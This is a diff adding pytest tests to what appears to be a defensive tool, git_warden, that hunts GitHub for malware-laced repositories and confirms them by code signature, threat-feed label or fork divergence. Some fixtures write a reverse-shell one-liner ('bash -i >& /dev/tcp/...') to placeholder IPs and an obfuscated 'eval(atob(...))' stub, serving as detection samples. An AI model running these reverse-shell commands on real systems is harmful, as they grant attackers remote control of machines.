@@ -49,6 +49,79 @@ def _fake_clone(full_name, dest, *, runner=None):
     return dest
 
 
+def test_hunt_signature_match_finds_novel_repo(tmp_path, monkeypatch):
+    # The novel-repo engine: a confirmed-malware code signature surfaces a sibling
+    # infected repo OSM doesn't have -> confirmed -> gold-eligible.
+    import base64
+
+    import git_warden.config as cfg
+    from git_warden.enums import DetectionMethod
+
+    sig_file = tmp_path / "sigs.json"
+    sig_file.write_text('[{"name":"x","query":"OBFUSTUB"}]', encoding="utf-8")
+    monkeypatch.setattr(cfg, "MALWARE_SIGNATURES_PATH", sig_file)
+
+    class SigClient(FakeClient):
+        def search_code(self, query, per_page=20):
+            if "OBFUSTUB" in query:
+                return [{"repository": {
+                    "full_name": "attacker/infected", "owner": {"login": "attacker"},
+                    "html_url": "https://github.com/attacker/infected"},
+                    "path": "postcss.config.js"}]
+            return []
+
+    def clone_mal(full_name, dest, *, runner=None):
+        dest.mkdir(parents=True, exist_ok=True)
+        blob = base64.b64encode(b"z" * 200).decode()
+        (dest / "postcss.config.js").write_text(
+            f"module.exports={{}};eval(atob('{blob}'))\n", encoding="utf-8")
+        return dest
+
+    db = Database.open(tmp_path / "sig.sqlite")
+    hunt(db, SigClient(), TOOLS, run_id="sig", now=utcnow(),
+         do_ioc=False, do_lineage=False, do_actor=False, do_enrich=False, do_osm=False,
+         do_signature=True, do_tier2=True, clone=clone_mal)
+    row = db.conn.execute(
+        "SELECT status, detection_method FROM repo_findings WHERE full_name = ?",
+        ("attacker/infected",)).fetchone()
+    assert row is not None
+    assert row["detection_method"] == DetectionMethod.SIGNATURE_MATCH.value
+    assert row["status"] == "confirmed"
+    assert any(r["full_name"] == "attacker/infected" for r in db.undelivered_gold())
+    # The mined signature is recorded for future hunts (the learning loop).
+    assert db.learned_signatures()
+    db.close()
+
+
+def test_hunt_osm_repo_validation_confirms(tmp_path):
+    # do_osm clones OSM-labeled repos directly and confirms genuine ones.
+    from git_warden.enums import ArtifactType, DetectionMethod, FeedSource
+    from git_warden.models import MaliciousArtifact
+
+    db = Database.open(tmp_path / "osm.sqlite")
+    db.start_run("seed", utcnow())
+    db.upsert_artifact(MaliciousArtifact(
+        artifact_type=ArtifactType.REPO, name="lurer/wallet-task", ecosystem="github",
+        source=FeedSource.OPEN_SOURCE_MALWARE,
+        raw_payload={"resource_identifier": "https://github.com/lurer/wallet-task"}), "seed")
+
+    def clone_mal(full_name, dest, *, runner=None):
+        dest.mkdir(parents=True, exist_ok=True)
+        (dest / "run.sh").write_text("bash -i >& /dev/tcp/9.9.9.9/443 0>&1\n", encoding="utf-8")
+        return dest
+
+    hunt(db, FakeClient(), TOOLS, run_id="osm-run", now=utcnow(),
+         do_ioc=False, do_lineage=False, do_actor=False, do_enrich=False, do_osm=True,
+         do_tier2=True, clone=clone_mal)
+    row = db.conn.execute(
+        "SELECT status, detection_method FROM repo_findings WHERE full_name = ?",
+        ("lurer/wallet-task",)).fetchone()
+    assert row is not None
+    assert row["detection_method"] == DetectionMethod.OSM_REPOSITORY.value
+    assert row["status"] == "confirmed"
+    db.close()
+
+
 def test_hunt_lineage_to_confirmed_gold(tmp_path):
     db = Database.open(tmp_path / "h.sqlite")
     delivered = []
@@ -58,7 +131,7 @@ def test_hunt_lineage_to_confirmed_gold(tmp_path):
         run_id="hunt-1", now=utcnow(),
         do_ioc=False, do_lineage=True, do_tier2=True, gold=True,
         clone=_fake_clone,
-        notifier=lambda row: (delivered.append(row["full_name"]) or True),
+        notifier=lambda cluster: (delivered.extend(r["full_name"] for r in cluster) or True),
     )
 
     assert summary["counts"]["candidates"] == 1
@@ -73,7 +146,7 @@ def test_hunt_lineage_to_confirmed_gold(tmp_path):
     assert "code_hash" in payload
     assert row["code_hash"]  # promoted to a column for cross-platform dedup
     # eval #18: validate WHY it confirmed, not just the count.
-    assert any(s.startswith("bash:") for s in json.loads(row["signals"]))
+    assert any(s.startswith("static:") for s in json.loads(row["signals"]))
     assert row["score"] >= 5  # Tier-1 + accumulated bash_score
     assert "Tier-2 confirmed" in (row["reasoning"] or "")
     assert payload.get("bash_findings")  # provenance for the gold message
@@ -106,4 +179,97 @@ def test_hunt_without_tier2_leaves_candidates_screened(tmp_path):
     assert summary["counts"]["confirmed"] == 0
     assert summary["counts"]["screened"] == 1
     assert not db.findings_by_status("confirmed")
+    db.close()
+
+
+def test_hunt_uses_work_dir_and_cleans_up(tmp_path, monkeypatch):
+    # GW_WORK_DIR honored, and scratch fully removed even with read-only files.
+    import os
+    import stat
+
+    import git_warden.config as cfg
+    workroot = tmp_path / "scratch"
+    workroot.mkdir()
+    monkeypatch.setattr(cfg, "WORK_DIR", workroot)
+
+    seen = {}
+
+    def ro_clone(full_name, dest, *, runner=None):
+        dest.mkdir(parents=True, exist_ok=True)
+        seen["workdir"] = dest.parent
+        (dest / "implant.sh").write_text(
+            "bash -i >& /dev/tcp/1.2.3.4/4444 0>&1\n", encoding="utf-8"
+        )
+        gitdir = dest / ".git"
+        gitdir.mkdir()
+        pack = gitdir / "pack-x.idx"
+        pack.write_text("x", encoding="utf-8")
+        os.chmod(pack, stat.S_IREAD)  # git leaves read-only pack files behind
+        return dest
+
+    db = Database.open(tmp_path / "wd.sqlite")
+    hunt(db, FakeClient(), TOOLS, run_id="hunt-wd", now=utcnow(),
+         do_ioc=False, do_lineage=True, do_actor=False, do_tier2=True, clone=ro_clone)
+    db.close()
+
+    assert seen["workdir"].parent == workroot       # scratch landed under WORK_DIR
+    assert list(workroot.iterdir()) == []           # fully cleaned; no husks
+
+
+def test_hunt_work_dir_falls_back_to_system_temp(tmp_path, monkeypatch):
+    import tempfile
+    from pathlib import Path
+
+    import git_warden.config as cfg
+    monkeypatch.setattr(cfg, "WORK_DIR", None)
+
+    seen = {}
+
+    def clone_ok(full_name, dest, *, runner=None):
+        dest.mkdir(parents=True, exist_ok=True)
+        seen["workdir"] = dest.parent
+        (dest / "x.sh").write_text("echo hi\n", encoding="utf-8")
+        return dest
+
+    db = Database.open(tmp_path / "wd2.sqlite")
+    hunt(db, FakeClient(), TOOLS, run_id="hunt-wd2", now=utcnow(),
+         do_ioc=False, do_lineage=True, do_actor=False, do_tier2=True, clone=clone_ok)
+    db.close()
+
+    assert seen["workdir"].resolve().parent == Path(tempfile.gettempdir()).resolve()
+    assert not seen["workdir"].exists()  # cleaned up
+
+
+class _MirrorClient(FakeClient):
+    def get_repo(self, owner, name):
+        return {"default_branch": "main"}
+
+    def compare(self, base_full, base_branch, head_full, head_branch):
+        return {"ahead_by": 0, "files": []}  # unmodified mirror
+
+
+class _DivergedClient(FakeClient):
+    def get_repo(self, owner, name):
+        return {"default_branch": "main"}
+
+    def compare(self, base_full, base_branch, head_full, head_branch):
+        return {"ahead_by": 5, "files": ["setup.sh"]}  # diverged, changed setup.sh
+
+
+def test_hunt_drops_unmodified_red_team_fork(tmp_path):
+    # P1: a fork identical to the upstream tool is rejected, never gold.
+    db = Database.open(tmp_path / "mir.sqlite")
+    hunt(db, _MirrorClient(), TOOLS, run_id="hunt-mir", now=utcnow(),
+         do_ioc=False, do_lineage=True, do_actor=False, do_tier2=True, clone=_fake_clone)
+    assert not db.findings_by_status("confirmed")
+    assert db.findings_by_status("rejected")  # mirror rejected
+    db.close()
+
+
+def test_hunt_confirms_weaponized_red_team_fork(tmp_path):
+    # P1: a diverged fork whose changed files carry exfil/cred-theft confirms.
+    db = Database.open(tmp_path / "div.sqlite")
+    hunt(db, _DivergedClient(), TOOLS, run_id="hunt-div", now=utcnow(),
+         do_ioc=False, do_lineage=True, do_actor=False, do_tier2=True, clone=_fake_clone)
+    assert db.findings_by_status("confirmed")  # weaponization in diverged file
     db.close()
